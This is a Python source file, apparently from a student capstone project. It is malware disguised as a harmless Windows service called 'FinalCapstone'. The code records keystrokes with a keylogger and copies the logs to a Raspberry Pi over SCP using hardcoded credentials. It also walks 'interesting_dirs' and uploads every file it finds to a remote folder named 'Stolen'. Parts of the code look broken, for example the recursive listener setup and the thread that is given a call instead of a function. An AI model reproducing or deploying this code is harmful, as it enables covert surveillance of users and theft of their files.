from pickle import FALSE, TRUE
import time
from windowsservice import SMWinservice
from http import client
import paramiko
from scp import SCPClient
from finduser import *
from pynput.keyboard import Key, Listener
import logging
from datetime import datetime
import subprocess, os
import threading

def createsshclient(server, port, user, password):
    client = paramiko.SSHClient()
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(server, port, user, password)
    return client

def on_press(blyat):
    blyat = Key
    cyka = Listener
    now = datetime.today().strftime('%Y-%m-%d')
    logg = now + ".txt"
    logging.basicConfig(filename=(logg), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
    server = "raspberrypi.local"
    port = 22
    user = "pi"
    password = "password"
    ssh = createsshclient(server, port, user, password)
    scp = SCPClient(ssh.get_transport())
    
    logging.info(str(blyat))
    with cyka(on_press=on_press) as cyka1:
        cyka1.join() #function that acts as a keylogger adding text file to the current directory
        scp.put(cyka1, remote_path='/home/pi/logs')
    return cyka1



class totallyrealservice(SMWinservice):
    _svc_name_ = "FinalCapstone"
    _svc_display_name_ = "FinalCapstone"
    _svc_description_ = "Thats a cool service"


    def start(self):
        self.isrunning = TRUE

    def stop(self):
        self.isrunning = FALSE

    def main(self):
        while self.isrunning:
            x = threading.Thread(target=on_press(),args=())
            x.start()
            server = "raspberrypi.local"
            port = 22
            user = "pi"
            password = "password"
            ssh = createsshclient(server, port, user, password)
            scp = SCPClient(ssh.get_transport())
            #print("check 1")
            for path in interesting_dirs:
            
                full_file_paths = get_filepaths(path) # path is the starting path that the function will walk through
                for filepath in full_file_paths:
                        try:
                            scp.put(filepath, remote_path='/home/pi/Stolen')
                            time.sleep(.1)
                        except (OSError, KeyboardInterrupt) as error:
                            
                            subprocess.call(["D:\Python38-32\muke.bat"])
                            pass
       
if __name__ == '__main__':
    totallyrealservice.parse_cmd()